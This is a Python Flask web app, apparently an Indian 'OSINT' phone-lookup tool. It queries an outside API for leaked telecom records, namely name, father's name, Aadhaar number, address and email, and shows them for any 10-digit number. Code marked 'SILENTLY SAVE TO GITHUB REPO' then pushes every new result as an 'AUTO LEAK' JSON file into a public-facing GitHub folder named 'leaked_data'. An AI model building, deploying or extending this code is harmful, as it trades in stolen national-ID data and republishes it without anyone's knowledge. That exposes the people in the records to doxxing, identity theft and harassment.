from flask import Flask, request, render_template_string
import requests
import json
import os
import hashlib
import base64
from datetime import datetime

app = Flask(__name__)

# ✅ API Configuration
API_KEY = "demo"
API_URL = "https://exploitsindia.site/osint/api.php"

# ✅ GitHub Configuration - APNA DALO
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")  # ← GitHub se Personal Access Token banao
GITHUB_REPO = "anmolHackerkali/Server"  # ← Apna repo name
GITHUB_LEAK_FOLDER = "leaked_data"  # ← Is folder mein data save hoga

def save_to_github(number, data):
    """Data ko GitHub repo mein push karo"""
    
    # Filename generate karo
    name = data[0].get('name', 'UNKNOWN') if data else 'UNKNOWN'
    name_clean = name.replace(' ', '_').replace('.', '')[:20]
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    hash_id = hashlib.md5(f"{number}_{timestamp}".encode()).hexdigest()[:8]
    filename = f"INDIA_LEAK_{name_clean}_{number}_{hash_id}.json"
    
    # Leaked data format
    leak_data = {
        "metadata": {
            "source": "INDIAN_TELECOM_LEAK_2026",
            "extracted_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "extracted_by": "PYAURA_ENGINE"
        },
        "target_phone": number,
        "records": data
    }
    
    # Convert to JSON
    json_content = json.dumps(leak_data, indent=2, ensure_ascii=False)
    
    # GitHub API se file push karo
    github_url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{GITHUB_LEAK_FOLDER}/{filename}"
    
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    # Check if file already exists
    check = requests.get(github_url, headers=headers)
    
    if check.status_code == 200:
        # File already hai - update karo
        sha = check.json()['sha']
        content = base64.b64encode(json_content.encode()).decode()
        
        payload = {
            "message": f"📁 AUTO LEAK: {number}",
            "content": content,
            "sha": sha
        }
        
        result = requests.put(github_url, headers=headers, json=payload)
        if result.status_code in [200, 201]:
            print(f"✅ UPDATED in repo: {filename}")
            return True
    else:
        # Naya file banayein
        content = base64.b64encode(json_content.encode()).decode()
        
        payload = {
            "message": f"📁 AUTO LEAK: {number}",
            "content": content
        }
        
        result = requests.put(github_url, headers=headers, json=payload)
        if result.status_code in [200, 201]:
            print(f"✅ LEAKED TO GITHUB: {filename}")
            print(f"   → https://github.com/{GITHUB_REPO}/blob/main/{GITHUB_LEAK_FOLDER}/{filename}")
            return True
    
    return False

def check_number_in_github(number):
    """Check karo ki number already github repo mein hai ya nahi"""
    github_url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{GITHUB_LEAK_FOLDER}/"
    
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    try:
        result = requests.get(github_url, headers=headers)
        if result.status_code == 200:
            files = result.json()
            for f in files:
                if number in f['name']:
                    return True  # Already hai
    except:
        pass
    
    return False

# ✅ GitHub Token Config Check
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>● PHONE_LOOKUP v2.0 ●</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
            font-family: 'Share Tech Mono', monospace;
        }
        .container {
            background: #0d0d1a;
            width: 100%;
            max-width: 520px;
            border-radius: 16px;
            padding: 30px 24px;
            border: 1px solid #1a1a3a;
        }
        h1 {
            font-family: 'Orbitron', monospace;
            text-align: center;
            color: #00f3ff;
            font-size: 22px;
            letter-spacing: 2px;
            margin-bottom: 20px;
        }
        .sub {
            text-align: center;
            color: #6b6b8a;
            font-size: 11px;
            margin-bottom: 20px;
        }
        input[type="text"] {
            width: 100%;
            padding: 14px;
            border-radius: 10px;
            border: 1px solid #1a1a3a;
            background: rgba(0,0,0,0.6);
            color: #00ff41;
            font-family: 'Share Tech Mono', monospace;
            font-size: 20px;
            text-align: center;
            outline: none;
            margin-bottom: 12px;
        }
        input[type="text"]:focus {
            border-color: #00f3ff;
            box-shadow: 0 0 15px rgba(0,243,255,0.15);
        }
        button {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 10px;
            background: linear-gradient(135deg, rgba(0,243,255,0.15), rgba(0,255,65,0.1));
            color: #00f3ff;
            font-family: 'Share Tech Mono', monospace;
            font-size: 16px;
            cursor: pointer;
            border: 1px solid rgba(0,243,255,0.2);
            transition: all 0.3s;
        }
        button:hover {
            border-color: #00f3ff;
            box-shadow: 0 0 20px rgba(0,243,255,0.2);
        }
        .result-box {
            margin-top: 20px;
            background: rgba(0,0,0,0.7);
            border-radius: 12px;
            border: 1px solid rgba(0,255,65,0.15);
            overflow: hidden;
        }
        .result-header {
            background: rgba(0,255,65,0.05);
            padding: 10px 16px;
            border-bottom: 1px solid rgba(0,255,65,0.1);
            display: flex;
            justify-content: space-between;
        }
        .result-header .title { color: #00ff41; font-size: 11px; }
        .result-header .num { color: #00f3ff; font-size: 13px; }
        .detail-row {
            display: flex;
            justify-content: space-between;
            padding: 8px 16px;
            border-bottom: 1px solid rgba(255,255,255,0.03);
        }
        .detail-label { color: #6b6b8a; font-size: 11px; }
        .detail-value { color: #e0e0ff; font-size: 12px; text-align: right; max-width: 55%; }
        .detail-value.green { color: #00ff41; }
        .error {
            margin-top: 16px;
            background: rgba(255,0,0,0.08);
            border: 1px solid rgba(255,0,0,0.25);
            border-radius: 10px;
            padding: 12px;
            color: #ff4444;
            text-align: center;
            font-size: 12px;
        }
        .footer {
            text-align: center;
            margin-top: 16px;
            padding-top: 12px;
            border-top: 1px solid rgba(255,255,255,0.04);
            font-size: 10px;
            color: #2a2a4a;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>● PHONE_LOOKUP ●</h1>
        <div class="sub">
<p style="color: red;">Yaha aap aap 📱 number enter kare <br> Fir <storage>Ditels</storage> per 🔘 Click kare agar Number ka Ditels na nikale to uska data leak ℹ️ hai <br>Ab aap dusara 📱 Number daal kar 🔘 chick kare</p></div>
        
        <form method="POST">
            <input type="text" name="phone" placeholder="9876543210" 
                   value="{{ phone or '' }}" required maxlength="10" pattern="[0-9]{10}">
            <button type="submit">⚡ Ditels </button>
        </form>
        
        {% if result %}
        <div class="result-box">
            <div class="result-header">
                <span class="title">⫸ RESULT</span>
                <span class="num">+91 {{ num }}</span>
            </div>
            <div class="result-body">
                {% for r in result %}
                <div class="detail-row">
                    <span class="detail-label">NAME</span>
                    <span class="detail-value green">{{ r.name }}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">FATHER</span>
                    <span class="detail-value green">{{ r.fname }}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">AADHAAR</span>
                    <span class="detail-value green">{{ r.aadhar }}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">ADDRESS</span>
                    <span class="detail-value">{{ r.address }}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">OPERATOR</span>
                    <span class="detail-value">{{ r.circle }}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">EMAIL</span>
                    <span class="detail-value{% if r.email %} green{% endif %}">{{ r.email or 'N/A' }}</span>
                </div>
                {% endfor %}
            </div>
        </div>
        {% endif %}
        
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        
        <div class="footer">◆ PYAURA_OSINT_ENGINE ◆</div>
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    result = None
    error = None
    phone = ""

    if request.method == 'POST':
        phone = request.form.get('phone', '').strip()

        if not phone or not phone.isdigit() or len(phone) != 10:
            error = "सिर्फ 10 अंकों का नंबर डालें"
        else:
            try:
                # Check if already in GitHub
                already_saved = check_number_in_github(phone)
                
                # API call
                params = {'key': API_KEY, 'type': 'number', 'num': phone}
                resp = requests.get(API_URL, params=params, timeout=15)
                data = resp.json()

                if data.get('status') == 'success' and data.get('result'):
                    result = data['result']
                    
                    # SILENTLY SAVE TO GITHUB REPO
                    if not already_saved:
                        saved = save_to_github(phone, result)
                        if saved:
                            print(f"[🔴] LEAKED TO GITHUB: {phone}")
                        else:
                            print(f"[⚠️] GitHub save failed: {phone}")
                    else:
                        print(f"[🔵] Already in repo: {phone}")
                else:
                    error = f"कोई डेटा नहीं मिला: {data.get('message', '')}"
            except Exception as e:
                error = f"Error: {str(e)}"

    return render_template_string(HTML_TEMPLATE, result=result, error=error, phone=phone, num=phone)

if __name__ == '__main__':
    print("🔥 PyAura OSINT Engine v2.0 (GitHub Leak Mode)")
    print(f"👉 App: http://0.0.0.0:5000")
    print(f"👉 Data saving to: https://github.com/{GITHUB_REPO}/{GITHUB_LEAK_FOLDER}")
    app.run(host='0.0.0.0', port=5000, debug=False)  # debug=False for Render